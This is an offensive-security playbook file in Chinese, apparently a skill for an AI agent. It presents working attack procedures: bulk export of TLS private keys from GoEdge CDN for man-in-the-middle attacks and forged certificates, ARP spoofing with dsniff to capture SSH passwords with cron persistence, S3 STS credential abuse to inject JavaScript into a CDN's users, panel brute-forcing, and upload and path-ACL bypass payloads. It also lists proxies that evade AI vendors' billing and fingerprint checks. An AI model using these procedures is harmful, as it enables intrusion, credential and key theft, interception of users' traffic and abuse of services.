---
name: specialized-attack-playbooks
description: >-
  专题实战利用:GoEdge私钥导出,灰产CDN取证,ARP MITM,CDN→S3 STS链,宝塔+UniApp,AI IDE API反代,OCS+MinIO;含references/scripts支持文件索引。Use when applying specialized playbooks for GoEdge, CDN, ARP MITM, BT Panel, OCS, MinIO.
metadata:
  tags: [渗透测试, penetration-testing, 红队]
---

## 专题实战利用（全内联）

### GoEdge CDN(8002端口)私钥批量导出
```
指纹: curl -s http://T:8002/ → {"message":"Welcome to API"} | POST /SSLCertService/findEnabledSSLCertConfig → 要X-Cloud-Access-Token
漏洞: findEnabledSSLCertConfig 只校验身份不校验范围 → 任意管理员key可导出全系统TLS私钥(keyData=明文PEM base64)
认证两步: POST /APIAccessTokenService/getAPIAccessToken {"accessKeyId":AK,"accessKey":SK,"type":"admin"} → data.token
          后续请求带 Header X-Cloud-Access-Token: <token>
批量提取(Python): for id in range(1,500): POST /SSLCertService/findEnabledSSLCertConfig {"sslCertId":id} headers={token}
  → r.json()['data']['sslCertJSON'] base64解码 → json → dnsNames + keyData(base64 PEM私钥) | 跳过 b64=="bnVsbA=="(null)
资产: Fofa app="GoEdge"&&port="8002" / Shodan http.title:"GoEdge" port:8002 / "Welcome to API" port:8002
利用: 私钥→MITM/流量解密/伪造证书 | AK/SK凭据复用打其他GoEdge实例 | 拿管理权访问CDN边缘节点
```

### 灰产CDN后渗透取证(拿下CDN后摸清它在运营什么)
```
五步: ①全量枚举证书(ID 1-500,过期/禁用的也含私钥,揭示历史运营) ②关键词初分类 ③真实访问验证(关键!不能只信证书域名,
      requests跟随重定向看最终落地页title/meta/h1/JS跳转) ④按真实内容重新分类 ⑤标注高价值目标
关键词矩阵(dnsNames分类): 钱包钓鱼 tokenpocket/tokenpoket(字母置换抢注)/metamask/trust | 支付诈骗 paypal/wxpay/bayspay/147pay
  成人付费站群 xiuren/xrw/sood/laikantu/tuhaokan/kantu | 盗版影视 7she/acgzy/yiyiyi/dilige/80sjdy/mogudong
  VPN翻墙 futo-on/xyou/gogocloud/douyinjiasu/tudoujiasu | 泛站群SEO 0x000/tc7/vn00/fc000/ikkk(程序化泛解析跳转链) | 彩票诈骗 0149/dh49/999pian(pian=骗)
高价值标注: A级有效期内钱包/支付私钥→MITM/HTTPS钓鱼绿锁 | B级ACME自动续期证书可持续监控 | C级AK/SK凭据复用+WHOIS关联运营者其他资产
识别特征(🔴极高): 同服务器混部正常+涉黄+盗版 | 大量泛站群通配符证书 | 品牌域名+仿冒域名同CDN(内部人运营钓鱼) | 唯一管理员key可导全部私钥(GoEdge默认无隔离)
```

### ARP MITM同L2窃取SSH密码(目标同网段,密码未知)
```
适用: 目标同L2(同Hyper-V宿主/同VLAN)+有已控跳板机+目标SSH密码未知
🚨关键坑: arpspoof报"couldn't arp for host"(libnet解析MAC在Hyper-V/CentOS7常超时)
  修复: ip neigh replace 目标IP lladdr 目标MAC dev eth0 nud permanent (网关同样预填) → 跳过libnet解析,arpspoof即正常
部署: echo 1>/proc/sys/net/ipv4/ip_forward | arpspoof×4双向(目标↔网关各一进程) | tcpdump -w x.pcap -s0 -C100 -W10 host 目标
  dsniff -i eth0 -w /tmp/dsniff.log (专抓SSH/FTP/HTTP明文密码)
持久化: crontab '*/2 * * * * /root/mitm_chk.sh'补位 + rc.local开机自启
验证: pgrep -c arpspoof==4 | tcpdump -r x.pcap看是否截获目标流量
事件通知: hermes cron create 'every 2 minutes' --no-agent --deliver feishu:chat_id (有鱼才通知:脚本检测dsniff日志新内容→stdout输出→投递,无新内容静默)
清理: pkill arpspoof/tcpdump/dsniff | echo 0>ip_forward | crontab去mitm行 | ip neigh del 各条 | rm pcap/log
```

### 多层域名轮换CDN防封系统 → S3 STS凭据升级攻击链
```
架构识别: 入口域名 → JS跳转层1(随机子域+通配符DNS) → 跳转层2 → 真实业务站(静态Landing)
  CDN特征: Server: Xcdn | "Please access via the domain name" | 987dns.com 国内DNS调度(海外返0.0.0.0)
  关键突破点:
    ①真实业务站HTML内联JS中暴露mainDomains列表(层层递进)+base64编码的子站跳转配置
    ②最深层Landing页引用CDN外源站资源(ug458.com/idcpc8.com等)→ 绕过CDN直接打源站
    ③源站是S3(AmazonS3 header/ListBucket公开) → 暴露bucket名
    ④同站提供APK下载 → 逆向提取API域名+AES密钥+STS获取路径
    ⑤注册→登录→JWT→/BBS/GetSTSToken → AWS STS临时凭据(PutObject权限)
    ⑥S3写入 = CDN源站篡改 = 全用户JS注入(等效RCE)
  
  技术细节:
    AES-CBC加密API通信: 密钥在前端JS(lazyDecryptImg.js)和APK(.so strings)双重暴露
    ASP.NET后端: 从validation错误格式+traceId判断 | form-urlencoded优先(JSON可能415)
    注册无验证: 无SMS/无验证码/任意手机号 → 批量注册可能
    STS过度授权: 普通用户角色获得s3:PutObject → 覆盖CDN源站文件
    S3 bucket ListBucket公开: prefix参数无效(CDN缓存), 但直连S3域名可全量枚举
  参考: references/cdn-antiblock-s3-attack-chain.md
```

### 宝塔面板(BT Panel)渗透 + UniApp/DCloud APK逆向
```
=== 宝塔面板指纹识别 ===
指纹: 端口19362/8888/随机高端口 + Cookie名含32位MD5 hash + "_ssl"后缀 (如 721301c19a31e887cb1f5a5726fbaae5_ssl)
  Set-Cookie出现在404响应中 = 确认宝塔面板; 888端口通常放phpMyAdmin(403=IP白名单)
安全入口: 新版宝塔强制随机8位路径(/xxxxxxxx/),不猜到就进不去面板。所有API端点都在安全入口路径后面。
  爆破策略: 域名相关变体(bt+域名前缀) + 常用运维习惯(admin888/bt123456/btpanel) + 8位随机(成功率极低)
  绕过: 无已知通用绕过(2024+); 旧版CVE-2023-38038(phpmyadmin未授权)仅<=7.7
  横向思路: 同IP多站共享宝塔 → 找弱站突破 → 横向到目标站; 宝塔默认www用户管所有站点

=== UniApp/DCloud APK逆向(极高效) ===
识别: assets/dcloud_uniplugins.json + assets/apps/<appid>/ + uni-jsframework.js
核心: 业务逻辑全在 assets/apps/<appid>/www/ 目录的JS/Vue文件中(无需jadx反编译Java)
  API提取: grep -r 'https\?://' assets/apps/ | 过滤baseURL/apiUrl/request配置
  认证: 搜索token/key/secret/Authorization → 硬编码凭据常见于config.js/env.js/manifest.json
  加密: 搜索aes/encrypt/decrypt/sign → 前端加密=明文(密钥必在JS中)
  WebSocket: 搜索wss://ws:// → 实时通信后端地址
优先级: manifest.json(appid/版本/权限) → config或env相关JS(API地址) → 页面JS(业务逻辑/IDOR)

=== 橙子建站(ChengZi/d3504.cn) SDK解密 ===
场景: 色情/灰产APP分发落地页常用ChengZi做免填邀请+跳转+APK分发
init3接口: POST /web/<appkey>/<channel>/init3 → 返回URL-safe base64编码的XOR加密数据
解密: base64url_decode → 逐字节XOR 0x96 → JSON(含fu=下载URL, ph=安装包路径, fm=跳转方式)
  脚本: scripts/chengzi_decrypt.py
利用: 解密拿到真实APK的阿里云FC函数URL → 下载APK → 逆向提取后端API
```

### AI IDE API反代/key泄露目录(发现并评估AI编程工具反代方案)
```
背景: Cursor Web免费API 2026-04起只剩gemini-3-flash,Claude全砍 → 拿Claude 4.6+需其他渠道
可用方案: freemodel-cc-proxy(免费,FreeModel真Claude,伪装Claude Code指纹绕403,Opus4.8/Sonnet4.6) | WindsurfAPI(dwgx,Windsurf gRPC转API,100+模型,账号池轮询)
  askalf/dario(Claude Pro/Max订阅转API,绕headless计费) | bypass/chatgpt-adapter(xllm-go,多家逆向接口聚合转OpenAI格式)
已废: cursor2api/cursor2api-go(只剩gemini-3-flash) | 辅助: claude-tap(MITM拦AI Agent真实流量研究system prompt/工具调用)
GitHub搜索法: api.github.com/search/repositories?q=cursor+api+reverse+proxy&sort=stars → 过滤desc → /repos/<o>/<r>/readme(base64解码读) → /search/issues查最新状态
关键词: cursor api reverse proxy / cursor workos token / claude proxy cursor / AI IDE api reverse engineering
```

### OCS在线客服系统渗透 + MinIO对象存储利用
```
发现入口: 落地页HTML客服链接暴露OCS域名(如leiyushan.com) → Playwright加载SPA截获真实API调用
认证流程: POST /api/v1/v/init {cid,vid} → data.tk = visitor token; 后续请求头 x-v-token: <token>
核心API: /api/v1/v/bc(开始聊天) /api/v1/v/oss/sign(获取上传签名) /api/v1/v/message/send(发消息)
上传链: GET /api/v1/v/oss/sign → {sn,et,ul,ulw,dir,cid,og} → POST https://UL/api/v1/f/wj/tr
  请求头: sign=<sn>, expTime=<et>  表单: file=@file, cid=<cid>, dir=<dir>, og=<og>, fn=<filename>, fg=0
黑名单绕过(白名单外扩展名被拦截):
  ✓ .jsp.jpg(双扩展名,最后ext通过检测) ✓ .jsp%00.jpg(空字节截断) ✓ .jsp;.jpg(Tomcat路径参数)
  ✗ .jsp/.jspx/.JSP/.Jsp/war/php/py/sh/xml/svg/html/txt/json/yaml/properties/sql/doc/ini/conf
⚠️ 文件存储在MinIO对象存储=静态对象,不会被Tomcat执行(需写入webroot才能RCE)
  验证: curl https://UL/bucket/dir/date/filename → 返回文件内容(纯文本,非执行)
dir参数穿越: sign服务不验证dir内容(总返回固定bucket sign); upload服务检查bucket权限
  dir=conf → 500(尝试写conf bucket但权限不足) dir=../../ → 500(穿越被拒)
MinIO Console(端口9001): POST /api/v1/login {"accessKey":"X","secretKey":"Y"} → 403=invalid Login
  CVE-2023-28432: POST /minio/health/cluster?verify → 新版已修补(返回BadRequest不泄露env)
CDN层识别(响应大小指纹):
  CDN WAF拦截页 ~2000字节 | WSCN JS挑战页 ~6000字节(Embed Iframe) | nginx 404 = 146字节
  Spring Boot JSON 404 ~100字节 | Tomcat HTML 404 ~435字节
nginx方法限制: admin路径(/api/v1/a/ /api/v1/s/)只允许GET → POST返回405
WSCN网宿CDN JS挑战: Playwright自动通过 | 路径白名单独立于JS挑战(过了挑战仍按路径ACL拦截)
Spring Boot路径穿越: /c/..;/path → 绕过nginx路径ACL到达Spring Boot (分号=Tomcat路径参数截断)
BT Panel入口: Set-Cookie泄露cookie名 → 入口路径随机8位不可推导,只能暴力枚举
Longteng CDN: TLS证书暴露所有关联域名 | Server头暴露源站OS版本
```

## 支持文件索引

```
=== references/ 攻击链实录 ===
cdn-antiblock-s3-attack-chain.md        多层域名轮换CDN防封→S3 STS凭据升级链
faka-system-attack-chain.md             发卡系统(XHFAKA/星海)枚举/二阶XSS/锁定绕过/WAF盲区
ocs-im-system-attack-chain.md           OCS在线客服IM系统完整攻击链
ocs-minio-upload-attack-chain.md        OCS上传→MinIO对象存储利用链
chinese-app-distribution-pentest.md     国产灰产APP分发落地页渗透(ChengZi/FC/CDN)
phpcms-v9-attack-surface.md             PHPCMS V9攻击面

=== references/ CDN/Spring/WebSocket绕过 ===
spring-boot-cdn-bypass.md               Spring Boot Actuator路径穿越+拦截器绕过
cdn-waf-bypass-spring-boot.md           CDN WAF绕过(502/JS挑战)+Spring后端
cdn-bypass-gccdn-ocs.md                 GCCDN/网宿响应过滤绕过
cdn-websocket-bypass-spring-auth.md     WebSocket升级绕CDN到达Spring
stomp-websocket-cdn-bypass.md           STOMP over SockJS CDN绕过
sockjs-stomp-exploitation.md            SockJS/STOMP越权+SpEL注入
spring-stomp-sockjs-exploitation.md     Spring STOMP认证+越权订阅

=== references/ nginx/PHP指纹 ===
nginx-pathinfo-bypass-and-fingerprint.md   PATH_INFO绕deny+响应大小指纹
nginx-php-fingerprint-bypass.md            nginx/PHP-FPM指纹差分
nginx-404-differential-fingerprinting.md   catch-all vs 真404差分枚举

=== references/ APK逆向 ===
uniapp-apk-reverse-engineering.md       UniApp/DCloud完整逆向(JS/.so/.dat)
uniapp-apk-reversing.md                 UniApp逆向速查(RC4解混淆+域名发现)
uniapp-dcloud-apk-reversing.md          DCloud结构+HTTPDNS辨识
bt-panel-attack-methodology.md          宝塔面板指纹+入口爆破+横向

=== scripts/ ===
js_rc4_deobfuscate.js       JS RC4+字符串数组旋转反混淆(提取→node解码)
chengzi_decrypt.py          橙子建站init3 XOR解密(fu下载URL)
decrypt_aes_cbc_api.py      AES-CBC加密API通信解密模板(硬编码key/iv)
s3_sts_exploit.py           AWS S3 STS临时凭据利用(验证/列目录/写入/权限枚举)
stomp_sockjs_exploit.py     STOMP over SockJS利用模板(CDN绕过+认证+注入)
spring_stomp_exploit.py     Spring STOMP越权订阅/发送
```

